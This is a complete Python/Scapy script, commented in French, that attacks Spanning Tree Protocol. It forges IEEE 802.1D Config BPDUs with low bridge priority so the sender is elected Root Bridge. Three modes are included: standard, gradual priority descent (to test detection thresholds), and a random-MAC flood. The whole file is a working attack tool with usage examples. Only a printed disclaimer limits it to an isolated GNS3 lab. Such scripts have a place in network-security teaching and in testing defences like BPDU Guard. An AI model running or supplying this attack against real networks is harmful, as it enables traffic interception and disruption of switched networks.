#!/usr/bin/env python3
"""
attack_root_hijack.py — Script d'attaque Root Hijack STP
=========================================================
Envoie des BPDUs Config avec une priorité inférieure au Root légitime
pour tenter de se faire élire Root Bridge.

Usage :
  sudo python3 attack_root_hijack.py -i <interface> [options]

Exemples :
  # Attaque basique sur eth0 avec priority=4096 (meilleure que 32768)
  sudo python3 attack_root_hijack.py -i eth0

  # Attaque agressive : priority=0, MAC=00:00:00:00:00:01
  sudo python3 attack_root_hijack.py -i eth0 --priority 0 --mac 00:00:00:00:00:01

  # Attaque lente (1 BPDU/2s) pour tester la détection
  sudo python3 attack_root_hijack.py -i eth0 --interval 2.0

  # Attaque en rafale (100 BPDUs/s) pour saturer
  sudo python3 attack_root_hijack.py -i eth0 --interval 0.01 --count 200

Dépendances :
  pip install scapy
"""

import argparse
import struct
import sys
import time
import random
from datetime import datetime

try:
    from scapy.all import sendp, Ether, Raw, get_if_hwaddr
except ImportError:
    print("❌ Scapy requis : pip install scapy")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════════════════
#  Construction du BPDU Config
# ══════════════════════════════════════════════════════════════════════════════

def mac_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(':'))


def build_bpdu_config(
    root_priority: int,
    root_mac: str,
    bridge_priority: int,
    bridge_mac: str,
    port_id: int = 0x8001,
    root_path_cost: int = 0,
    message_age: int = 0,
    max_age: int = 20,
    hello_time: int = 2,
    forward_delay: int = 15,
) -> bytes:
    """
    Construit un BPDU Config IEEE 802.1D brut.

    Structure :
      Protocol ID     : 2 bytes (0x0000)
      Version         : 1 byte  (0x00)
      BPDU Type       : 1 byte  (0x00 = Config)
      Flags           : 1 byte
      Root ID         : 8 bytes (priority 2 + mac 6)
      Root Path Cost  : 4 bytes
      Bridge ID       : 8 bytes (priority 2 + mac 6)
      Port ID         : 2 bytes
      Message Age     : 2 bytes (×256)
      Max Age         : 2 bytes (×256)
      Hello Time      : 2 bytes (×256)
      Forward Delay   : 2 bytes (×256)
    """
    root_id    = struct.pack('!H', root_priority) + mac_to_bytes(root_mac)
    bridge_id  = struct.pack('!H', bridge_priority) + mac_to_bytes(bridge_mac)

    bpdu = (
        b'\x00\x00'                          # Protocol ID
        b'\x00'                              # Version
        b'\x00'                              # Type : Config BPDU
        b'\x00'                              # Flags
        + root_id                            # Root Bridge ID
        + struct.pack('!I', root_path_cost)  # Root Path Cost
        + bridge_id                          # Bridge ID
        + struct.pack('!H', port_id)         # Port ID
        + struct.pack('!H', message_age * 256)
        + struct.pack('!H', max_age * 256)
        + struct.pack('!H', hello_time * 256)
        + struct.pack('!H', forward_delay * 256)
    )
    return bpdu


def build_frame(bpdu: bytes, src_mac: str) -> bytes:
    """
    Encapsule le BPDU dans une trame Ethernet 802.3 avec LLC.
    DST = 01:80:c2:00:00:00 (adresse multicast STP standard)
    """
    dst = b'\x01\x80\xc2\x00\x00\x00'
    src = mac_to_bytes(src_mac)
    length = struct.pack('!H', len(bpdu) + 3)  # +3 pour LLC
    llc    = b'\x42\x42\x03'                   # DSAP=STP, SSAP=STP, Control=UI

    return dst + src + length + llc + bpdu


# ══════════════════════════════════════════════════════════════════════════════
#  Scénarios d'attaque
# ══════════════════════════════════════════════════════════════════════════════

def attack_standard(args):
    """
    Attaque classique : se déclarer Root avec une priorité inférieure.
    C'est ce qu'un attaquant réel ferait avec un laptop + scapy.
    """
    print(f"\n{'='*60}")
    print(f"  🔴 ATTAQUE ROOT HIJACK — Standard")
    print(f"  Interface    : {args.interface}")
    print(f"  MAC attaquant: {args.mac}")
    print(f"  Priorité     : {args.priority}")
    print(f"  Intervalle   : {args.interval}s")
    print(f"  Nombre       : {args.count if args.count else '∞'}")
    print(f"  Démarrage    : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}\n")

    sent = 0
    try:
        while args.count is None or sent < args.count:
            bpdu  = build_bpdu_config(
                root_priority=args.priority,
                root_mac=args.mac,
                bridge_priority=args.priority,
                bridge_mac=args.mac,
                root_path_cost=0,
            )
            frame = build_frame(bpdu, args.mac)
            pkt   = Ether(dst='01:80:c2:00:00:00', src=args.mac) / Raw(load=frame[12:])
            sendp(pkt, iface=args.interface, verbose=False)
            sent += 1

            status = f"[{datetime.now().strftime('%H:%M:%S')}] BPDU #{sent} envoyé — priority={args.priority} mac={args.mac}"
            print(status)

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print(f"\n[!] Attaque interrompue après {sent} BPDUs.")


def attack_gradual(args):
    """
    Attaque progressive : commence avec une priorité légèrement meilleure,
    puis diminue progressivement pour tester les seuils de détection.
    """
    print(f"\n{'='*60}")
    print(f"  🔴 ATTAQUE ROOT HIJACK — Progressive")
    print(f"  Interface    : {args.interface}")
    print(f"  MAC attaquant: {args.mac}")
    print(f"  Priorité     : 32768 → {args.priority} (décroissante)")
    print(f"{'='*60}\n")

    priorities = list(range(32768, args.priority - 4096, -4096))
    sent = 0
    try:
        for prio in priorities:
            print(f"\n[~] Phase : priority={prio}")
            for _ in range(5):
                bpdu  = build_bpdu_config(
                    root_priority=prio,
                    root_mac=args.mac,
                    bridge_priority=prio,
                    bridge_mac=args.mac,
                )
                frame = build_frame(bpdu, args.mac)
                pkt   = Ether(dst='01:80:c2:00:00:00', src=args.mac) / Raw(load=frame[12:])
                sendp(pkt, iface=args.interface, verbose=False)
                sent += 1
                print(f"  BPDU #{sent} — priority={prio}")
                time.sleep(args.interval)

    except KeyboardInterrupt:
        print(f"\n[!] Attaque interrompue après {sent} BPDUs.")


def attack_flood(args):
    """
    Flood de BPDUs avec MACs aléatoires pour perturber la table STP.
    Simule une attaque par épuisement de ressources.
    """
    print(f"\n{'='*60}")
    print(f"  🔴 ATTAQUE ROOT HIJACK — Flood MACs aléatoires")
    print(f"  Interface    : {args.interface}")
    print(f"  Priorité     : {args.priority}")
    print(f"{'='*60}\n")

    sent = 0
    try:
        while args.count is None or sent < args.count:
            # MAC aléatoire à chaque BPDU
            rand_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
                random.randint(0, 255) for _ in range(5)
            )
            bpdu  = build_bpdu_config(
                root_priority=args.priority,
                root_mac=rand_mac,
                bridge_priority=args.priority,
                bridge_mac=rand_mac,
            )
            frame = build_frame(bpdu, rand_mac)
            pkt   = Ether(dst='01:80:c2:00:00:00', src=rand_mac) / Raw(load=frame[12:])
            sendp(pkt, iface=args.interface, verbose=False)
            sent += 1
            print(f"  BPDU #{sent} — priority={args.priority} mac={rand_mac}")
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print(f"\n[!] Flood interrompu après {sent} BPDUs.")


# ══════════════════════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='Script d\'attaque Root Hijack STP — pour démonstration uniquement',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Scénarios :
  standard   Attaque classique (défaut)
  gradual    Priorité décroissante progressive
  flood      Flood avec MACs aléatoires

Exemples :
  sudo python3 attack_root_hijack.py -i eth0
  sudo python3 attack_root_hijack.py -i eth0 --priority 4096 --scenario gradual
  sudo python3 attack_root_hijack.py -i eth0 --scenario flood --interval 0.01
        """
    )
    parser.add_argument('-i', '--interface', required=True,
                        help='Interface réseau (ex: eth0)')
    parser.add_argument('--mac', default=None,
                        help='MAC de l\'attaquant (défaut: MAC de l\'interface)')
    parser.add_argument('--priority', type=int, default=4096,
                        help='Priorité STP à annoncer (défaut: 4096, < 32768 légitime)')
    parser.add_argument('--interval', type=float, default=2.0,
                        help='Intervalle entre BPDUs en secondes (défaut: 2.0)')
    parser.add_argument('--count', type=int, default=None,
                        help='Nombre de BPDUs à envoyer (défaut: infini)')
    parser.add_argument('--scenario', choices=['standard', 'gradual', 'flood'],
                        default='standard',
                        help='Scénario d\'attaque (défaut: standard)')

    args = parser.parse_args()

    # MAC par défaut = MAC de l'interface
    if args.mac is None:
        try:
            args.mac = get_if_hwaddr(args.interface)
        except Exception:
            args.mac = '02:00:00:00:00:01'
            print(f"[!] Impossible de lire le MAC de {args.interface}, utilisation de {args.mac}")

    print(f"""
⚠️  AVERTISSEMENT
Ce script est destiné UNIQUEMENT à des fins éducatives et de démonstration
dans un environnement de lab isolé (GNS3).
L'utilisation sur un réseau de production est illégale.
""")

    scenarios = {
        'standard': attack_standard,
        'gradual':  attack_gradual,
        'flood':    attack_flood,
    }
    scenarios[args.scenario](args)


if __name__ == '__main__':
    main()
